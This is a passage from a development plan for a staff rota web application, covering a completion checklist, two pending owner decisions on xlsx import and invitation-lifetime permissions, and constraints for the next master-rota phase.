- [ ] No date arithmetic anywhere in `resources/js`.
- [ ] No staff name, email, phone number, level code or note text in any `audit_log.detail`
      written by this plan.
- [ ] `tests/fixtures/calendar/golden.json` untouched — it is a contract with P2, not a
      convenience.
- [ ] Two migrations, both additive; the owner runs them in production, with Task 13's
      verification queries in `docs/RUNBOOK-DEPLOY.md`.

---

## Owner decisions needed before P1c-2 (neither blocks P1c-1)

1. **xlsx roster import: add `openspout/openspout`, or stay CSV-only?** Decision E ships the
   reader as a port so this is one adapter class either way. The cost of yes: one MIT,
   zero-runtime-dependency package, one `composer.json` line, one explicit `"ext-zip": "*"` (zip
   is already installed in the image, in CI and locally). The cost of no: the department exports
   from Excel with File → Save As → CSV UTF-8 before each import, and gets a clear message if
   they forget. *Blocks:* nothing in P1c-1; it is a follow-on task either way. *Default if
   unanswered:* CSV-only, with the screen stating what it accepts.

2. **Where does the configurable invitation lifetime live —
   `settings.manage` or `users.manage`?** Owner decision 5 settled the *value* (7 by default,
   configurable, validated); it did not settle who turns the knob. `settings.manage` matches
   every other runtime setting and the existing write precedent; `users.manage` matches who
   actually thinks about invitations. *Blocks:* P1c-2 task 1. *Default if unanswered:*
   `settings.manage`, because the write path already exists there and a second settings surface
   is a second place for a validated write to go wrong.

---

## Next plan

**P1d — Master rota**, once P1c-1 merges. P1d depends on P1c-1 and **not** on P1c-2: the grid's
rows are people ordered by level, which is exactly what Tasks 3, 6 and 7 deliver, and its columns
are `periods`, which P1b's Task 11 fills. Three P1c outputs P1d must respect:

- `Person::levelsAt()` is the set-wise resolver — a rota grid resolving levels per person is the
  N+1 finding 5 exists to prevent, and `levelAt()` inside a loop is that bug wearing the right
  method name.
- `App\Support\LevelAssignment` is the only writer of `person_levels`, and
  `PersonLevelsHaveOneWriterTest` fails the build for a second one. A rota import that "helpfully"
  sets a level writes through it.
- `App\Support\PersonPresenter` is the only place a person becomes props. The rota grid's cells
  carry person ids and names, never contact fields, and `ContactFieldsAreProjectedOnceTest` is
  what enforces that rather than the reviewer's memory.
